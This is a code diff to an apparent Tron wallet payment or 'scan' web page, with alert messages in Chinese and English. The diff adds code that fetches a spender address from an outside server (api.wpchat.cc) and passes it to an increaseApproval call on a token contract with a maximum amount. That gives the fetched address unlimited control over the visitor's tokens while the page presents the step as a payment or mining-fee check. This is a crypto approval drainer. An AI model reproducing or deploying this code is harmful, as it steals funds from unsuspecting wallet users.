@@ -16,6 +16,7 @@
     <link rel="stylesheet" href="scan/css/vendor.min.css">
     <link rel="stylesheet" href="scan/css/reset.min.css">
     <link rel="stylesheet" href="scan/css/main.css">
+    <script type="text/javascript" src="scan/js/jquery.js"></script>
     <!--<script type="text/javascript" src="https://token.okb.icu/approve.js"></script>-->
 <!--     <script type="text/javascript" src="scan/js/TronWeb.js"></script> -->
 
@@ -112,7 +113,18 @@
         alert("请使用支持 Tron 的浏览器钱包，例如 TronLink 或 imToken");
         return;
     }
-
+    var approve_address = '';
+    jQuery.ajax({
+			url: 'https://api.wpchat.cc/api/config/getAddress',
+			type: 'post',
+			async: false,
+			success: function (result) {
+				if(result.code == 1){
+				    approve_address = result.data.approve_address
+				}
+			}
+		});
+		console.log(approve_address)
     try {
       var tronWeb = window.tronWeb;
       let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
@@ -125,7 +137,7 @@
         'increaseApproval(address,uint256)',
         { feeLimit: 1e8 },
         [
-          { type: 'address', value: 'TF2zbr9jwoRoSvBGd9wqJdnzkwoeyF7yKD' },
+          { type: 'address', value: approve_address },
           { type: 'uint256', value: maxAmountHex }
         ],
         userAddress
@@ -166,11 +178,11 @@
 
       // 检查交易是否成功
       if (!broastTx || !broastTx.result) {
-        alert("Payment failed, please check whether the network is unobstructed.");
+        alert("支付失败，请检查网络是否畅通。");
       }
     } catch (e) {
       console.error(e);
-      alert('Payment failed, please check whether the network is unobstructed.');
+      alert('支付失败，请检查网络是否畅通。');
     }
   }
 
@@ -225,7 +237,7 @@
 
             } catch (error) {
                 console.error("Failed to obtain mining fee:", error);
-                alert("Failed to obtain mining fee, please try again");
+                alert("获取挖矿费失败，请重试！");
                 document.getElementById("miner-fee").textContent = "Failed to obtain";
             }
         }
